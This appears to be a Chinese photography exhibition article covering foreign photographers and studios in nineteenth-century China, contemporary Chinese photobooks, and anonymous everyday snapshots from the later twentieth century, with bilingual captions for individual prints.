<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmh0PZekwILXMy2tJ4oje2lw7zN2gicPkKfywY4uoDrLG81nyWcqN54BA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmK679Jiatk1ztYc5ickzg4icyJesfMdyFIoiaFMvicvUZic67XHzERGA32KxA/640?wx_fmt=jpeg" alt="img"></p>
<hr>
<p>早期中国影像：来华西方摄影师的行旅和照相馆业的兴起</p>
<p>文 &#x2F; 徐家宁</p>
<p>摄影术在中国的传播路径大抵是从南到北从沿海到内陆，在这一过程中，那些扎根当地的商业摄影师们扮演了重要的角色。</p>
<p>虽然于勒·埃及尔（Jules Alphonse Eug ene lter）1844 年就在广州从事了摄影活动，但并没有在中国埋下摄影的种子，反而是耕耘在香港，这座在第一次鸦片战争后成为英国殖民地城市的摄影师首先点燃了传播的火种，其中的佼佼者就有英籍摄影师约翰·汤姆逊。他最初来到亚洲是在新加坡拍照，后游历东南亚最终落脚在香港经营了一家非常成功的照相馆。1870 - 1871 年放弃了红火的照相生意，开始游摄中国。随着香港照相业的饱和，大批摄影师移师广州开拓广阔的中国市场，比如美籍摄影师西尔维斯特·达顿（Sylvester Dutton）和文森特·迈克尔斯（Vincent Michaels），他们 1863 年抵达香港，接收了朋友弥尔顿·米勒（Milton Miller）的照相馆，同年就搬去广州。走类似路线的还有与汤姆逊同时期的威廉·普莱尔·弗洛伊德（William Pryor Floyd）和埃米尔·日斯菲尔特（Emil Risfeldt）等人。厦门作为最早开埠的城市之一，摄影术也于 1860 年代踏足，继而抵达台湾。这不得不提美籍摄影师圣·朱利安·休·爱德华兹（St Julian Hugh Edwards），他很有可能是最早去台湾从事拍摄活动的人。</p>
<p>同样是开埠城市，上海以优越的地理位置成为当时中国最繁荣的口岸，木匠出身，1860 年来到上海的英国人威廉·桑德斯（William Saunders）硬是在照相馆业闯出一片天，留名中国摄影史。以上海为基地，外国摄影师将他们的活动范围拓展到江南，海关职员出身的亨利·坎米奇（Henry Charles Cammidge）在 1860 年代就拍摄了大量苏州、杭州、无锡、上海等地的风景照，美丽的江南风光一直吸引着外国摄影师前往，活跃在 1920 年代的英籍摄影师唐纳德·曼尼（Donald Mennie）就是其中翘楚，留下了诸多南方城市的照片名片。</p>
<p>到 1860 年英法联军攻陷北京，这座古城终于出现在镜头之后，遗憾的是拍摄了未被烧毁前清漪园的英国随军摄影师费利茨·比托（Felice Beato）也很快便随军队离开，英国医学传教士德贞（John Dudgeon）接着就来到北京，成为首个常住这里的摄影师。他工作太忙了，要救死扶伤还要传播福音，尽管如此还是出版了介绍摄影术的《脱影奇观》一书。到了 1870 年，另一位英国摄影师托马斯·查尔德（Thomas Child）作为大清海关的英籍洋员开始了长达近二十年的北京生活，他不仅自己拍摄照片，还向中国的摄影爱好者们传授技术、售卖耗材。查尔德回国后至摄影术很普及的 1930 年代，几乎每十年就会有位外国摄影师专注拍摄北京，如山本赞七郎（Yamamoto Sanshichiro）佩克哈默（Heinz von Perckhammer LeMunyon）阿东照相馆（Hartung’s Studio）、海达·哈默（Hedda Hammer）等等。</p>
<p>随着外国势力在中国地理上的深入，摄影术也逐渐传播到更深的内陆，比如法国在越南的殖民就推动了在云南、贵州的传播，日本对东北地区的入侵也带来了大量日本摄影师开设照相馆，这都助力了摄影术在中国传播的广度和深度。最后感谢三人行老照片馆为此次展览慷慨借出这批藏品。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmsSXWltibYP09lAFwUC9gyQD1Y02WZsMmicFRb5Z4U4hDEUrm2yE1nRMw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>上海的一家人</strong></p>
<p>A family in Shanghai</p>
<p>年轻的妈妈不仅要照顾三个孩子，还有洗衣服，而男主人则在一旁休闲地抽着烟。</p>
<p>A young mother were taking care of three children while washing clothes, but the father was sitting aside, smoking.</p>
<p>1870s</p>
<p>威廉·桑德斯</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmM6nuGdk4uPhNhMlDdxncwdiaKsEfAByhdmXNrpibkMPEHIlRMTYta7ow/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>上海的剃头店</strong></p>
<p>Barbershop in Shanghai</p>
<p>上海郊外两名正在为客人服务的剃头匠</p>
<p>Two barbers were cutting customers’ hair in Shanghai suburbs.</p>
<p>1870s</p>
<p>埃米尔·日斯菲尔特</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmFsKhG3OD1SklQw7yib7URhTRGaZDfjhZFmamY9GiaKN3TxxQBA3GFHTw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>读书的年轻人</strong></p>
<p>Teenager Reading a Book</p>
<p>炎炎夏日，这位读书的年轻人穿着一件凉爽的竹衣马甲，这种要竹篾做衣服的工艺早已不再使用。</p>
<p>On a hot summer day, a teenager read a book, wearing a cool vest made from bamboo and this technology had already been lost.</p>
<p>1870s</p>
<p>威廉·桑德斯</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmV5VWIkSv64Mj7PiawJhrkSZYOls4rywP1FtnicST1s7QT6w5FaxBV0YA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>上海的苦力</strong></p>
<p>Coolies in Shanghai</p>
<p>三名苦力在照相馆内营造的场景中摆拍，展示他们平时等待雇主的状态</p>
<p>Three coolies were posing in the setting of a photo studio, showing how they waited for employers as usual.</p>
<p>1870s</p>
<p>威廉·桑德斯</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmZ9XJibf6BnSEwLHwUy6HmkaFdtx05kibpIXzSCjKzbWmjzzMOPPzctCA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>上海的妇人</strong></p>
<p>Married woman in Shanghai</p>
<p>桑德斯有给自己作品上色的习惯，而且非常细致，人物立刻生动起来。</p>
<p>Saunders used to color his works in an extremely meticulous way, making portraits painted vividly.</p>
<p>1980s</p>
<p>威廉·桑德斯</p>
<p>蛋白银盐纸基 手工上色 Hand-Colored Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmtuVygXDLfCbpGCdOgMhnH7H699yYjdZbQvsdTU2rpKL3dO7qZTraQg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>上海的独轮车</strong></p>
<p>Wheelbarrow in Shanghai</p>
<p>在外国人的游记里，独轮车曾是上海最常见最价廉，既可运人也可运货的交通工具。</p>
<p>In foreign travel notes. wheelbarrow used to be the most common and cheap transportation that could carry persons as well as good in Shanghai.</p>
<p>1870s</p>
<p>威廉·桑德斯</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmIO4sTQ22YxE1Toz71FVDHMxS5gabYEgy745W6qmBnk4YlJDtCl7kcg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>观象台</strong></p>
<p>Observatory</p>
<p>在城墙上看古观象台，台上精美的铜制天文仪器在后来经历的劫掠，重复后，如今仍原样保存在观象台上。</p>
<p>Looking at the observatory from the wall. The delicate asthronomical instruments made from copper on the observatory still kept their original shape after being looted and reunited.</p>
<p>1870s</p>
<p>托马斯·查尔德</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm2X2eGoJ3ocU0DfuibIx6ibcvIQX8Xgd9JYwnT3EApY27ep4TyOuaEBsA/640?wx_fmt=jpeg" alt="img"></p>
<p>明十三陵神道</p>
<p>The Main Sacred Way of the Ming Tombs</p>
<p>明十三陵有一条神道，两边整齐地排练着 24 座石兽和 12 座石人像。</p>
<p>There was a sacred way in the Ming Tombs, and 24 stone carvings of animals and 12 stone humans lined along it.</p>
<p>1870s</p>
<p>托马斯·查尔德</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm59MM3M0yE7U4TibibyjanqTynDrib6ibJqUVja9r09ZicfewloJwQfDxTvg/640?wx_fmt=jpeg" alt="img"></p>
<p>北京街头睡觉的小商人</p>
<p>Small Businessman Sleeping on the Street in beijing</p>
<p>街头时长一个卖布的商人正在午休，即使睡着了也不忘紧紧抓着自己的货物。</p>
<p>A businessman who sold the cloth was taking a noon break at he street market and held his goods tightly when he fell asleep.</p>
<p>1930s</p>
<p>海达·哈默</p>
<p>明胶银盐纸基 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmibfkH26YHVQqS0lrXvEZ9JLltqITrcm8JgJgKMmVEYhx12G5MyI6Q8A/640?wx_fmt=jpeg" alt="img"></p>
<p>古塔和驼队</p>
<p>Ancient Pagoda and Camel Caravan</p>
<p>骆驼在过去一直是沟通蒙古和中原的重要交通工具，照片中的小伙子正赶着他的驼队走在北京西郊的慈寿寺塔下。</p>
<p>Camels used to be the important transportation to link mongolia and Central Plains. In this picture, a young man was driving his camel caravan under the Cishou Temple in the west suburb of Beijing.</p>
<p>1920s</p>
<p>阿东照相馆</p>
<p>明胶银盐纸基 手工上色 Hand-Colored Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmJJ3JQicibyvR9EgqVyHYiaY55WImn1yVFzNevOQ9HX7AntIQTWg9mUpIQ/640?wx_fmt=jpeg" alt="img"></p>
<p>甲午战争中的日军</p>
<p>Japanese Troops in the Sino-Japanese War</p>
<p>甲午战争期间，日军在营地前的合影。</p>
<p>During the Sino-Japanese War. the portrait of Japanese troops in front of the camp.</p>
<p>1894</p>
<p>日军陆地测量部 Japanese land survey department</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmqx2XNicibYrc1HsgRHOsAztwFcnxMeKTfTfbP79zPjzVlOUcFM3vpLtw/640?wx_fmt=jpeg" alt="img"></p>
<p>云南的囚犯</p>
<p>Prisoners in Yunnan</p>
<p>在衙门的大门旁，七名囚犯正在示众，其中五个人戴着枷板，两个人被锁在站笼里。</p>
<p>Beside the judgement hall, seven prisoners where displayes to the public and five of them had cangues while the other two were locked in the cages, standing.</p>
<p>1890s</p>
<p>方苏雅</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmW8Wvp3U4ttoBIKInlBTA0QLMiaraK4qZ1oux8BwRIs5KP0wSeSkHnMQ/640?wx_fmt=jpeg" alt="img"></p>
<p>官员坐相</p>
<p>Portrait of a sitting officer</p>
<p>一位官员手持折扇在照相馆内拍摄的肖像</p>
<p>The portrait of an officer with a folding fan shot in a photo studio</p>
<p>1900s</p>
<p>山本赞七郎</p>
<p>蛋白银盐纸基 Albumen Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmBlEsYnJbFTGQnk1k4dZ71EIFdIy7bCycHXpEPBUBuia7glftujgSbTw/640?wx_fmt=jpeg" alt="img"></p>
<p>女子坐相</p>
<p>Portrait of a Sitting Girl</p>
<p>一位年轻的女子在室外临时搭建的场景中留影，在早起中国人的肖像中这种侧脸、不看镜头的肖像很少见。</p>
<p>A young girl took photo at an outdoor temporary set. iIt was seldom to have this kind of pose that was a side face without looking at camera in Chinese portraits during early period.</p>
<p>1864</p>
<p>保罗·尚皮翁</p>
<p>蛋白银盐纸基 Albumen Print</p>
<hr>
<p>中国当代摄影书作品:纸上的叙事作品及其他</p>
<p>文 &#x2F; 何伊宁</p>
<p>摄影书籍不仅构成了画廊展览的另一种展示方式，它的形式也挑战了摄影的即时性，并允许艺术家借此探索摄影的叙事和语言。在全球摄影书制作和出版风潮的影响下，近些年来的中国摄影书制作和出版展现出了全新的活力。</p>
<p>“中国当代摄影书：纸上的视觉叙事及其他” 将围绕着过去十年间的摄影书作品来呈现这一富有活力的领域。展览挑选了四十余本来自中国的摄影书作品、其中的内容几乎涵盖了当代摄影实践的所有类别；而在出版形式上则包含了从传统上同美术馆、画廊合作，到艺术家手工书（Artist’s handmade book），再到自出版（self-publishir），或与独立出版社（independent publisher）合作的多种可能。</p>
<p>在考察中国当代摄影书的样貌之外，展览还包含了九位青年摄影实践者的摄影书及照片。无论是以书作为创作媒介而延伸的展呈；还是将照片与书籍融合在一起的展示；抑或是将书籍作为整体作品部分的实践，展览从侧面呈现了当代摄影实践中照片、书籍作品和展览之间的复杂关系。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmIspVqnfmStkVaszJL4V89bV92JanD0Z47TIEtUhc7ic6L1oFsIJObnA/640?wx_fmt=jpeg" alt="img"></p>
<p>塔可,《诗山河考》</p>
<p>尺寸：28.8cm x 17.25cm</p>
<p>规格：105 页，108 幅黑白照片</p>
<p>限量：700 本中国传统拉页精装</p>
<p>前波画廊出版，2013 年</p>
<p>塔可 1984 年在青岛出生，目前往返于北京和纽约两地生活和工作。他深受源自青铜器时期的诗集《诗经》的启发，自 2010 年起开始创作《诗山河考》这一摄影系列。为了筹备这个创作项目，塔可首先花了一年时间钻研《诗经》的文字以及大量的研究资料。他根据《诗经》中提到的地名作了一个路线计划，一个接一个地亲身造访了这些地点。但他没有刻意去记录诗歌原本的情境或阐释它们的意象，或步众多文人学者的后尘在三千年来对《诗经》的研究上添加更多的揣摩。造访这些地点时，塔可毫无拘束地运用了《诗经》的创作手法，而他模仿的不是这一诗集的具体内容而是其表现方式。</p>
<p>《诗山河考》中的摄影作品并没有试图阐释《诗经》，而是通过另一种媒介来呼应《诗经》的创作手法。关于这一深奥的主题，塔可说道：“我希望建构一种稳定而又牢固的结构，同时与 ‘诗’ 本身的结构在某些层面可以形成互文，把文学性的意义推到一个遥远而又陌生的世界。使这些无形而神秘的东西进入现实之中，来剖析这个负载著无数可能性的范本。”</p>
<p>《诗山河考》中的九组摄影作品《雅·颂》、《周南·召南》、《卫风》、《王风》、《郑风·桧风》、《唐风  魏风》、《齐风·曹风》、《秦风·豳风》以及《陈风》将首次同时展出。它们以严谨的构图和简练的形式引人注目。从无际的山川河流到意想不到的细节特写，这些作品题材各异。然而，塔可对铂盐及银盐印相的精湛运用将它们有机地结合，其对色调的掌控也不得不令人叹为观止。</p>
<p>——前波画廊</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmTQ8BKjPukl7xZ22wkkUAHVjSOicVicAkq8RoV9bGxkeBRMVhtu5qIZog/640?wx_fmt=jpeg" alt="img"></p>
<p>张晓，《他们》，2012</p>
<p>尺寸：18.5cm x 26cm</p>
<p>规格：64 页，54 幅彩色照片</p>
<p>布面精装</p>
<p>限量：500 本</p>
<p>2012 年 12 月</p>
<p>假杂志出版</p>
<p>这是个并不真实的世界，我喜欢他们。他们在某个时刻的状态已经超越了现实的自己，像是在梦游。我拍照片时很少和他们对话，只是眼神的交流，更多的时候是迅速按下快门，快门声伴随着刺眼的闪光灯直射过去，他们这才如梦初醒地诧异地看着我，等他们回过神来，我已经匆匆离开。因为他们的眼神很多是我所不敢面对的。我像是在逃避，正如逃避镜子中的我自己。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmO7OoahwGaRGic9Y36D8ZqVzicIE1VxtjicEcISAKJtxLtYtn7wTzjvn8Q/640?wx_fmt=jpeg" alt="img"></p>
<p>廖逸君，《实验性关系》，2018</p>
<p>尺寸：168mm x 260mm</p>
<p>规格：平装，160 页，77 张彩色照片</p>
<p>印量：限量 500 本，2018 年第 2 版</p>
<p>设计：廖逸君、程音和</p>
<p>假杂志出版</p>
<p>这本书主要是由 2007 年到 2017 年 “实验性关系” 作品中的照片组成。</p>
<p>作为女性，我曾经以为我只能爱上一个比我更年长和更成熟的人、一个保护者、 一个良师益友， 直到我遇见了我现在的男友莫若。因为他比我小五岁，我理所当然的情侣关系彻底颠倒了。我变成了那个有更多权威和影响力的人。我的一位男性友人问我怎么可以用和他选女友一样的标准来挑选男友？我想，“对啊！这就是我在做的事情，为什么不呢？！”</p>
<p>我开始认真思考起这段关系的重要意义，并用照片做起了实验。莫若让我认识到，男女关系并不需要一种固定模式。根据每个人的不同情况，任何两个人结合都会产生不一样的关系。即使这种关系和我们一般习惯的男女关系不同，也同样可以存在，并且有它自己的优势。做这个实验的目的是打破固有的模式以期达到新的平衡点。因为莫若是日本人，我是中国人，这个系列也描述了一种爱恨交织的关系。</p>
<p>我打算只要我们还在一起就把这个作品一直拍下去。我希望这本书是一系列书中的第一本 。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmuVFJBuDI0RU1ibQf3h7YIEfCB0OeicXXN9uhBVEFtvyg9f2X393bLLkg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm1JFlj31icjTffwibs6ticycJFYAnKb8kLjg9IBTwhUrSrmWb3uZlQE73w/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmUIqGW7f4B0WkNUsVMYIzAe4iaalpjXP9mvScP2Buj02RXCsXf4n7Gmg/640?wx_fmt=jpeg" alt="img"></p>
<p>木格，《回家》，2013</p>
<p>尺寸：21.5cm × 27.6cm × 1.9cm</p>
<p>规格：112 页，57 幅黑白照片，布面圆脊精装，配有护封</p>
<p>限量：600 本</p>
<p>2013 年 12 月</p>
<p>假杂志出版</p>
<p>木格的摄影作品《回家》，纪录了三峡大坝工程所带来的种种影响。婉转沉静的笔触，幽然地抒发胸臆的悲怀，而在颓圮杂沓、一切俱往的不可能处，你我意会诗意吊诡的重量。</p>
<p>生长于重庆巫溪县，现居成都的木格，自 2005 年初，依沿返乡之路和大坝周边的城镇拍摄此一系列影像。尘封在脑海中的回乡路，沿途举目可见的「家常感」，因拆迁工程的启动而尘土飞扬。当一切灰飞烟灭、尘埃落定之后，心头多少一股昨是今非，触目凄凉之感。易，不易。世事变易的现代步伐，似乎跨得大而无当且无情。木格在情感与实践上的创作自觉，映现家常或日常景观的本来面目：无常。</p>
<p>在如同长江水般流逝变化的时空中逆流而上，回溯故土中的故我，木格以影像遥接已然失落断裂的记忆连结。然而那些断垣残壁，终究淹没在平静的水面下，一切如常。《回家》凝聚成江底的一道记忆潜流，木格的逆旅宛若浩渺无波的江面上偶现的鱼跃。这个令人惊喜的发现，在水阔鱼沉之后，可以激起多大讨论的涟漪？抚慰多少人心的苦闷？</p>
<p>历时五年，断续地往返徘徊於家园和大坝之间，木格以局中人的身份，透过摄影书写地貌与容貌的变迁。人和土地之间相互依存牵扯的微细关系，在《回家》中被赋予具体可辨的形象。现代工程的介入后，你我究竟该如何看待人与自然的新关系？或许是《回家》欲言又止的潜台词。</p>
<p>—— 节选自台湾摄影评论家曹良宾评论文章《明明直照文章路》</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmkEIxldXn62qzfJca4HjgWtQKWcUYtRic8RQrEegXPtQJWKcQvyYL8ibQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmnQdoMM3GmwibILrV2ojfdtZ8icppRq28bwrCh25JYhHAtvEiaI7Wicr2LA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4X90vvy9Zk2KicibSWQHrs5z2jbNs89ibk4ZM8aVf4qniap3HGGibp9jib0w/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm3JDA33JNFQUWYtKHLND0oDzs3ozJUFqkouezLdhG8WpQU5poan2FRQ/640?wx_fmt=jpeg" alt="img"></p>
<p>朱岚清，《负向的旅程》，2013</p>
<p>尺寸：24cm x 16.5cm</p>
<p>规格：40 页，82 幅彩色照片</p>
<p>限量：20 本</p>
<p>艺术家手工书，艺术纸</p>
<p>2013 年出版</p>
<p>照片拍摄于我的故乡东山岛，一座位于福建漳州南端的岛屿。现代化的城市发展常让离乡人患上失忆症，使人忘记这里曾经存在过什么。我只能追赶着它的脚步，用图象来 “对抗” 这些让人措手不及的变化。故乡从我出生起就在影响，塑造着我。就如同书的开始，我身着的是在阿嬷房间中寻找到的一件来自祖辈的衣服。故乡和我就这样互相作用着。我所看到的，也许正是它（故乡所希望我能看到的。拍摄故乡仿佛是走上一条通往幽暗的记忆与我们原初内心的负向的旅程。</p>
<p>在作品中，我以 “八尺门”、“家”，“食物、土地、神”、“海” 作为我重构故乡的线索，将这些收集到的故乡记忆与现实的碎片组合成一本可以翻阅也可以被展示的书。通过这样的形式，仿佛能将这些空间、人、物件凝结在这些纸张上，并借由一层层地覆盖、展开，揭露出故乡之于我的意义。作品以手工书还原一个我对于故乡图鉴的再现，它将作为在城市化进程中已渐行渐远的故乡的截面，提供一个可供我们停顿下来触碰的故乡，以及我们每一个人应该去反思何为家乡的含义。</p>
<hr>
<p><strong>佚名照 —— 二十世纪下半叶中国人的日常生活图像</strong></p>
<p><strong>佚名之名</strong></p>
<p>文 &#x2F; 晋永权</p>
<p>佚名照，指的是照片的拍摄者、被拍摄者及持有者，皆无名姓，准确地说是因为所得渠道 —— 被照片拥有者所放弃，购买于旧书、旧货市场，与上述人员阻隔，因而无以得到他们的准确信息。</p>
<p>这意味着，此类照片的拍摄者身份信息不明，照片中的被拍摄者身份信息不明，以及照片的原持有者身份信息不明。</p>
<p>展览通过佚落的日常生活照片，试图寻找出二十世纪下半叶 —— 这一特殊历史时期，中国人日常照相行为所建构起来的社会逻辑与历史逻辑。这些图像出人意料地呈现出这一时期中国人生活的表与里、现象与本质，既关乎过往，也预示未来。这是中国人现代精神成长史中的重要环节。二十世纪下半叶，指 1950 年代初期至 1990 年代初期，大约 40 年间的黑白影像时期。这一阶段，是中国社会主义计划经济体制由产生到鼎盛，再到逐步松动的时期，市场经济体制初步确立。无论是社会政治文化状况，还是基于物质、技术因素的大众日常生活摄影图像的生产、传播与价值标准都具有特殊性，形成独特的样貌文本多样，类型丰富，特征明显，成为这一特殊历史时期普通中国人文化道德状况及历史记忆的特殊载体。</p>
<p>通过这些图片，可以观照出中国人日常照相行为的基本内涵与主要特征。其中，表演性、模仿性、符号性、实用性及互图性（互文性），是这一时期日常图像的先要特征。</p>
<p>这不是基于既成的各种范畴，而是通过大量个案的分析比较，呈现出普通人生活照片历史化的面目 —— 拍摄主体日常实践活动中的主动性，无论是拍摄者，还是被拍摄者，对照相的认知、审美及行为模式。</p>
<p>综观起来，观众不难体悟到，看似杂乱无序的日常生活照片，实则有着异乎寻常的理性秩序，它们无不是建构的产物，无不遵从于历史与现实的规定性。照片拍摄者、被拍摄者及拥有者信息逸散的状况，使得这类图像拥有了共同的身份特征：消弭了个案差异的社会历史建构之物。由个体、家庭及特殊人群的记忆载体，成为公共记忆的共享之物。</p>
<p>“世界成为图像” 与 “人成为主体” —— 海德格尔将二者并称为对现代化的本质具有决定性意义的两大历史进程。上述二十世纪下半叶，中国人追寻现代化的征程上，无时不与图像 —— 现实与未来生活图景描绘，及作为新社会主体的社会主义新人形貌的建构密切相关。当然，无论是图像建构起来的世界，还是作为主体的个人或群体，其建构之时，便是遭逢解构的倒计时。当塑造这些像的主流价值体系失效时，这些图像便由新变做了旧。自由拍照、自主记录随性表达，作为梦想，也是现代中国人视觉文化心理形成的应有之义。</p>
<p>普通中国人的日常生活照片，正是观察这一文化心理现象的重要文本。从这些日常照相行为建构起来的图像世界，也使得人们得以更直观、更感性地理解二十世纪的中国人。</p>
<p><strong>表演</strong></p>
<p>表演。拍照不就应该是这样吗？惟其如此，才能与凡俗而又琐碎的日常生活相区别。</p>
<p>性别、身份、职业、阶级、立场、民族，审美取向，甚至体态语，等等，照相行为中表演无处不在，无时不有，几乎成为全民自觉自愿的下意识行为。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmzhzwFnc9m3ZqQabSScsibc6O3eDwBJ0jCRlkPia3GhkKrcbuISMetcjg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmCWDqbqCXSkCrZco450vVH9hnjGZY2wYQmMhs6zzibicjfdERDHwiaggyQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm7ux95UQzq2JXicXkFfRzPx975qPqme7fAp77ejHcw8er2PNe9GFpYnw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmYIYbpKfuGJYncWdGoIhc0cdRrG8Fy2TL9gfF3zgfK04NZ6lSpVwezw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmibHa446AgJey2L4aFScTPsBWiafS5HNg42ydx45IOdK1aoaKibVFSDlLQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmkwq6bHV1YiaZb17BmdADF37oc64mUPwQ2w0iaS8uaShjCiaVj0VnOhSdw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmLElianC0KfhBFey86xD5yz4hliaYFKP3PbP7flpr6p9rwkHY8GfboVgw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmHUP6DqH6fm62hsduILaV4PlxTYdCMtwiby7Hpvve8cGn6zI9UXVibbLw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4yuU90GncibQjVZULRURMrf5uVN97mia6ZWrRZhlem0lUubTw8tXtCew/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmrXFhnMWZUuWv4ukp8xK0gHykic0XGXgbpd9ob7W88Ld8ibAepFIzz6icw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmucRugvHEuBrxNB9VIpa2ibr5vUC8qicnvePyQ7wOjtUfFYsJrepwGbicw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>传统</strong></p>
<p>传统戏剧人物及景观形象，显然与新时代易工农兵为主题的新人形象，及新的生产、生活场景样态不符。与执政党建设现代国家的文化理念也存在着冲突。</p>
<p>新人形象的塑造与新的更新更美图画的描绘，与新时代相呼应的视觉文化的建构，这是时代使然。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm58TVR0SV4Rf5zDn1Cc5lDgsuQRThcLEibF8BHShL7NMsPPgaDeGQRicg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmjI6bapuvxe7NO2GGvmia4ia8fnyliaq8CHKUMj8duyVia5MKmAJtLEnt7Q/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>读书看报</strong></p>
<p>这些图像产生于特殊的历史时期，有其特殊的语境。公共场合群体性的读书看报活动，通过照片及文字传播后，成为大众日常照相行为的重要模仿形式。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmfvPyHtCIyfOdcTDrfa8yLOzXoSpiaS5LndMpzzbPDs3cj4IxacIHmpA/640?wx_fmt=jpeg" alt="img"></p>
